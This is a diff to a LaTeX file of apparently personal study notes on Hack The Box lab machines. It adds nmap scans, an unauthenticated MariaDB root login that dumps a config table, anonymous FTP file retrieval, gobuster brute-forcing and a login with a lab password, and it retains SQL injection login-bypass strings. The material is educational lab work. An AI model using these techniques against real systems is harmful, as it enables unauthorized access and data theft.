@@ -1,4 +1,4 @@
-\documentclass[a4paper,12pt]{article}
+\documentclass[a4paper,10pt]{article}
 \input{preamble}
 
 \usepackage{minted}
@@ -27,8 +27,28 @@
   colback=bg,
   colframe=black!70,
   listing only,
-  minted style=vs,
+  minted style=borland,
   minted language=mysql,
+  minted options={texcl=true},
+  left=1mm,
+}
+\newtcblisting{session}{
+  listing engine=minted,
+  colback=bg,
+  colframe=black!70,
+  listing only,
+  minted style=emacs,
+  minted language=shell-session,
+  minted options={texcl=true},
+  left=1mm,
+}
+\newtcblisting{txt}{
+  listing engine=minted,
+  colback=bg,
+  colframe=black!70,
+  listing only,
+  minted style=bw,
+  minted language=console,
   minted options={texcl=true},
   left=1mm,
 }
@@ -247,6 +267,11 @@ Look at \mintinline{bash}{-sS}. It says it performs a stealthy scan.
 Example:
 \begin{bash}
 nmap -A -T4 -sV "10.129.15.46"
+\end{bash}
+
+Very fast scan:
+\begin{bash}
+nmap -T5 -A -p- --min-rate=500 10.129.44.239
 \end{bash}
 
 \pagebreak
@@ -504,7 +529,9 @@ What is one of the most common type of SQL vulnerabilities? SQL Injection.
 
 What is the 2021 OWASP Top 10 classification for this vulnerability? A03:2021-Injection.
 
-What does Nmap report as the service and version that are running on port 80 of the target? \mintinline{bash}{Apache httpd 2.4.38 ((Debian))}.
+What does Nmap report as the service and version that are running on port 80 of the target?
+
+\mintinline{bash}{Apache httpd 2.4.38 ((Debian))}.
 \begin{bash}
 sudo nmap -sV -O -Pn -T4 -p 80 10.129.193.161
 \end{bash}
@@ -538,5 +565,86 @@ The \mintinline{mysql}{password='passwd' or '1'='1'} condition is always true, s
 \n
 
 Another way to do it is putting \mintinline{mysql}{user="' or 1#"} and \mintinline{mysql}{password="asd"}. The \mintinline{mysql}{#} character will comment out the rest of the line, and the constant \mintinline{mysql}{1} is always true.
+
+\subsection{Sequel \faLinux}
+
+During our scan, which port do we find serving MySQL? 3306 standard \mintinline{bash}{mysql} port.
+
+What community-developed MySQL version is the target running? MariaDB.
+
+When using the MySQL command line client, what switch do we need to use in order to specify a login username? \mintinline{bash}{-u}.
+
+Which username allows us to log into this MariaDB instance without providing a password? \mintinline{bash}{root}.
+
+In SQL, what symbol can we use to specify within the query that we want to display everything inside a table? \mintinline{bash}{*}.
+
+In SQL, what symbol do we need to end each query with? \mintinline{bash}{;}.
+
+There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that's unique to this host? \mintinline{bash}{htb}.
+\begin{session}
+[sekai@arch ~]$ mariadb -u root -h 10.129.44.239
+\end{session}
+\begin{sql}
+MariaDB [(none)]> show databases;
+MariaDB [(none)]> use htb;
+MariaDB [htb]> show tables;
+MariaDB [htb]> select * from config;
+\end{sql}
+
+\subsection{Crocodile \faLinux}
+
+What Nmap scanning switch employs the use of default scripts during a scan? \mintinline{bash}{-sC}.
+\begin{session}
+[sekai@arch ~]$ nmap -T5 -sC -A -p- --min-rate=500 "10.129.222.85"
+\end{session}
+\begin{txt}
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ::ffff:10.10.15.23
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
+|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Smash - Bootstrap Business Template
+Service Info: OS: Unix
+\end{txt}
+
+What service version is found to be running on port 21? \mintinline{bash}{vsftpd 3.0.3}.
+
+What FTP code is returned to us for the "Anonymous FTP login allowed" message? \mintinline{bash}{230}.
+
+After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously? \mintinline{bash}{anonymous}.
+
+After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server? \mintinline{bash}{get}.
+
+What is one of the higher-privilege sounding usernames in 'allowed.userlist' that we download from the FTP server? \mintinline{bash}{admin}.
+
+What version of Apache HTTP Server is running on the target host? \mintinline{bash}{Apache httpd 2.4.41}.
+
+What switch can we use with Gobuster to specify we are looking for specific filetypes? \mintinline{bash}{-x}.
+\begin{bash}
+ftp 10.129.222.85
+ftp> ls
+ftp> get allowed.userlist
+ftp> get allowed.userlist.passwd
+ftp> exit
+gobuster dir -x php -w directory-list-2.3-medium.txt -u 10.129.222.85
+\end{bash}
+
+Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service? \mintinline{bash}{login.php}.
+
+Go to \mintinline{bash}{10.129.222.85/login.php} and put \mintinline{bash}{username=admin} and \mintinline{bash}{password=rKXM59ESxesUFHAd}.
 
 \end{document}
